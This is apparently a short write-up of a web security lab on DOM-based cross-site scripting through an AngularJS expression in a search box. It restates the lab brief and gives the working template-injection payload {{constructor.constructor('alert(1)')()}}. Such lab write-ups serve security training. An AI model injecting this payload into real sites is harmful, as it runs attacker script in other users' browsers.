# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

***

According To The Question vulnerability in a Angular JS expression within the search functionality!!

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

Then I use a Angular Js XSS Payload -

```
{{constructor.constructor('alert(1)')()}}
```

<figure><img src="../../../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>



